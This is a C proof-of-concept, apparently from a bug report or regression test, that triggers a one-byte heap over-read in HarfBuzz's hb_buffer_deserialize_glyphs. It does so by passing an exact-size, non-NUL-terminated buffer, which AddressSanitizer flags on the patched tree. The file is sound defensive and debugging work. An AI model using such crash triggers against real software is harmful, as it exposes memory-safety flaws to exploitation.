/* PoC: heap-buffer-overflow (over-read) in hb_buffer_deserialize_glyphs.
 *
 * Public-API, in-contract usage: a valid glyph serialization string is passed
 * with an explicit (non-negative) buf_len, exactly as documented. The input
 * buffer is heap-allocated to its exact length (no trailing NUL), which the
 * API contract permits since the length is given explicitly.
 *
 * On the patched tree the deserialize preamble dereferences buf[buf_len]
 * (one past the end) while scanning for trailing line endings, producing an
 * AddressSanitizer heap-buffer-overflow. On the parent tree no such read
 * exists, so it does not fire.
 */
#include <hb.h>
#include <string.h>
#include <stdlib.h>

int main (void)
{
  const char *s = "[1=0+0]";
  int n = (int) strlen (s);

  char *buf = (char *) malloc (n);        /* exact size, no NUL terminator */
  memcpy (buf, s, n);

  hb_buffer_t *b = hb_buffer_create ();

  const char *end_ptr = NULL;
  hb_buffer_deserialize_glyphs (b, buf, n, &end_ptr,
                                NULL, HB_BUFFER_SERIALIZE_FORMAT_TEXT);

  hb_buffer_destroy (b);
  free (buf);
  return 0;
}
